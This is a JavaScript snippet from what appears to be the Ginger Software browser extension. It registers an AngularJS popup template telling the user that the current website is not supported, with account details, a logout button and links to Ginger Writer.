    e.put("partials/notsupported.partial.html", '<div class="popup-not-supported">\n' + '    <div class="popup-head">\n' + '        <div class="popup-head-logo"><img src="../assets/popup-logo.png" alt=""> for <span>{{::config.platform}}</span></div>\n' + "        <div class=\"popup-head-license\" ng-class=\"{'popup-head-license-basic':(session.license==1),'popup-head-license-premium':(session.license==2)}\"></div>\n" + '        <div class="popup-head-user dd" ng-class="{\'dd-open\':notsupported.ui.userListOpen}" mouseaway="notsupported.ui.setUserListOpen(false)">\n' + '            <a href="javascript:" class="dd-trigger" ng-click="notsupported.ui.setUserListOpen()"><span>{{::session.name}}</span><i class="gingericon-dropdown-arrow"></i></a>\n' + '            <div class="dd-content" ng-mouseover="notsupported.ui.setUserListOpen(true)">\n' + '                <div class="popup-head-user-body">\n' + '                    <div class="popup-head-user-body-email">{{::session.email}}</div>\n' + "                </div>\n" + '                <div class="popup-head-user-foot">\n' + '                    <a ng-click="notsupported.ui.logout()" class="btn">Log out</a>\n' + "                </div>\n" + "            </div>\n" + "        </div>\n" + "    </div>\n" + '    <div class="popup-body popup-body-nonsupported">\n' + '        <div class="popup-container">\n' + '        <div class="popup-body-nonsupported-title">\n' + '            <img class="popup-body-favicon" ng-if="notsupported.faviconUrl" ng-src="{{notsupported.faviconUrl}}"> {{notsupported.currentHostName}} Not Supported\n' + "        </div>\n" + "        <p>\n" + '            We hope to support {{notsupported.currentHostName}} in the future. But until then, you can use our <br><a href="https://www.gingersoftware.com/ginger-writer" target="_blank" rel="noopener">Ginger Writer</a>.\n' + "        </p>\n" + "        </div>\n" + "    </div>\n" + "\n" + '    <div class="popup-foot">\n' + "\n" + '        <div class="popup-container">\n' + '        <div class="popup-foot-row mute" >\n' + '            <a class="popup-foot-app" target="_blank" href="https://www.gingersoftware.com/ginger-writer" rel="noopener"> <i class="gingericon-writer"></i> Ginger Writer</a>\n' + '            <a class="popup-foot-app" target="_blank" href="https://www.gingersoftware.com/myginger/apps"> <i class="gingericon-apps"></i> Ginger Apps</a>\n' + "        </div>\n" + "        </div>\n" + "    </div>\n" + "</div>\n" + "");
} ]);